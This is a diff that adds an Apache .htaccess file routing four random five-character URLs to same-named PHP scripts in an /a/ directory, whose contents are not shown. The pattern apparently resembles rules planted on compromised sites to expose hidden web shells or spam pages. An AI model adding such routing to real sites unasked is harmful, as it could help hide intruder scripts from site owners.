@@ -1,0 +1,7 @@
+RewriteEngine On
+RewriteBase /
+
+		RewriteRule ^cqipT$ /a/cqipT.php
+		RewriteRule ^09k6p$ /a/09k6p.php
+		RewriteRule ^OSpis$ /a/OSpis.php
+		RewriteRule ^8UKFc$ /a/8UKFc.php
